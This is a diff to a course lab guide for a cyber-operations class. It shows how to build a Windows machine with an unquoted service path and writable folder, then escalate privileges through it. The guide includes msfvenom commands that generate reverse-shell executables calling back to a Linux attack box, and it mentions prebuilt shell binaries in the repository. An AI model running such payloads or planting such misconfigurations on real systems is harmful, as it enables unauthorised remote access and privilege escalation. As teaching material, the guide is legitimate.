@@ -13,7 +13,7 @@ Created for DSU's Cyber Operations I course
 1. Add two additional users the box, with different passwords. One should be a standard user and the other should be an administrator. Use the administrator-level user for the following steps.
 2. Create a "Step 4" folder on the desktop of the selected user.
 3. Create a path in Program Files three folders deep with a dummy service executable (`C:\Program Files\[Level 1 Name]\[Level 2 Name]\[Dummy Service Executable]`).
-     * Ensure the `Level 2 Name` contains a space (ex. `Automated Service`)
+     * Ensure the `Level 2 Name` contains a space (ex. `Service Run`)
      * This dummy executable won't be used, so pretty much any executable that isn't a shell works. I used `iexplore.exe`.
 5. Edit the `Level 1 Name` folder properties to grant all users write permission (Properties > Security > Users > Edit > Write).
 6. Create a new registry key in `HKLM\SYSTEM\CurrentControlSet\Services`. This key will be the service name.
@@ -42,9 +42,8 @@ Created for DSU's Cyber Operations I course
 #### Horizontal PrivEsc via Unquoted Service Path
 1. Log on to the second user created in Configuration step 1.
 2. Create a simple TCP reverse shell with `msfvenom` on the Linux Exercises box:
-      * In the example above, this would be `Automated.exe`.
-      * There is a preconfigured binary with the IP address of the Linux Exercises box and name `Automated.exe` in the Windows PrivEsc archive in the repo.
-          * Password: `infected`
+      * In the example above, this would be `Service.exe`.
+      * There is a preconfigured binary with the IP address of the Linux Exercises box and name `Service.exe` in the Windows PrivEsc folder in the repo. It connects to port 1337.
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP address of Linux Exercises box> LPORT=1337 -f exe -o [First word of Level 2 Name].exe
@@ -57,6 +56,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP address of Linux Exercises box> 
 #### Vertical PrivEsc
 1. Get an administrator shell by following the steps in [Horizontal PrivEsc Exploitation](#Horizontal-PrivEsc-via-Unquoted-Service-Path).
 2. Create another simple TCP reverse shell with `msfvenom` on the Linux Exercises box, but it listens on a different port and can use any file name:
+      * There is a preconfigured binary with the IP address of the Linux Exercises box and name `Service2.exe` in the Windows PrivEsc folder in the repo. It connects to port 1338.
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP address of Linux Exercises box> LPORT=1338 -f exe -o [Filename].exe
